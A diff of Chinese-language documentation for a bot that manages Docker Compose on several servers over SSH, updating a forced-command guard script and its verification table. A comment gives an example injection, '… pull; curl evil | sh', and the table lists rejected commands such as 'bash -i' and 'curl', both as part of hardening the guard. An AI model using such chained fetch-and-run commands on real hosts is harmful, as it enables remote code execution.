@@ -79,7 +79,8 @@ ssh-keyscan -p 22 10.0.0.5 >> ./data/ssh/known_hosts  # 可选：预置 known_ho
 ```sh
 #!/bin/sh
 # 远端 /usr/local/bin/mtbots-compose-guard
-# 只放行：docker compose ls … / docker compose -f <path> pull|up -d|config --services|ps / docker image prune
+# 只放行：docker compose ls … / docker compose -f <path> pull|up -d|stop|config --services|ps / docker image prune
+# 另外整条否掉含 shell 元字符（; & | $ ` \ > <）的串，否则 `… pull; curl evil | sh` 会被尾部 * 放行
 case "$SSH_ORIGINAL_COMMAND" in
   "docker compose ls"*|"docker compose -f "*" pull"*|"docker compose -f "*" up -d"*|\
   "docker compose -f "*" config --services"*|"docker compose -f "*" ps"*|"docker image prune -f"*)
@@ -271,7 +272,7 @@ class DockerHost:
 | 回调只认配置内 host | `handlers._reject_unknown_host()` | 伪造 id → `⚠️ 未知主机`，不执行任何命令（有用例断言） |
 | 清理 / 状态按主机 | `_show_prune_menu`（先选主机）、`_do_prune`、`_show_status`（每台一段） | 清理命令同样经 `host.command()` 包装 |
 | `--health` / `/id` / 首页摘要 | `__main__._health_probes`、`docker/__init__.py` | 逐主机项目数、主机异常 |
-| 远端准备与守卫 | `docs/examples/mtbots-compose-guard.sh`、`authorized_keys.sample`、README「管理多台服务器」 | 守卫已逐条验证：放行 bot 会发的 13 种命令形态，拒绝 `bash -i` / `docker run` / `docker exec` / `curl` |
+| 远端准备与守卫 | `docs/examples/mtbots-compose-guard.sh`、`authorized_keys.sample`、README「管理多台服务器」 | 守卫已逐条验证：放行 bot 会发的 14 种命令形态（含 v1.5.8 的 `compose stop`），拒绝 `bash -i` / `docker run` / `docker exec` / `curl` / 命令链；`tests/test_setup_script.py::GuardScriptTest` 真的用 `sh` 跑一遍守卫 |
 | 测试 | `tests/test_docker_module.py::Host*`、`MultiHostStateTest`、`tests/test_integration.py::MultiHostFlowTests` | 新增 30 条（总计 377，全绿） |
 
 **未做（有意留白）**：跨主机并行执行（全局仍是一把任务锁）、远端构建 / git / 日志 / `exec`、跨主机迁移容器或卷。
